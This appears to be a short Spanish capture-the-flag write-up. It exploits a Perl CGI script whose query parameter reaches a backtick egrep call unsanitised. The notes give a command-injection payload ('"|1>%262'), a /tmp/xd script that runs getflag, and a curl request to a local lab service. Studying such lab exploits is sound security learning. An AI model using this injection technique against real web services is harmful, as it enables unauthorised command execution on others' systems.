- Tenemos un scrip en perl
- Lo unico interesante que veo en el codigo del script es esta línea:
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
- Esta línea hace un egrep con el primer parametro de la consulta y aquí es donde está el vector de ataque
- El primer parametro es tratado para ponerlo en uppercase y quitar espacios
    $xx =~ tr/a-z/A-Z/;
    $xx =~ s/\s.*//;
- Se me ocurre intentar inyectar algo en el parametro para poder saltar el egrep y editar un archivo /tmp/xd para ejecutar condigo
- Lo primero es crear el archivo /tmp/xd
#!/bin/bash
/bin/getflag > /tmp/a
- Damos permisos al archivo /tmp/xd (importante)
- Ahora queda la inyeccion
- "|1>&2" quedando la línea egrep ""|1>&2"" /tmp/xd 2>&1
- se lo paso por curl
curl 'http://127.0.0.1:4646/?x="|1>&2"'
- No funciona porque el caracter & hay que urlncoder %26 quedando la inyeccioón
"|1>%262"
- Ahora cat a /tmp/a
- Listo

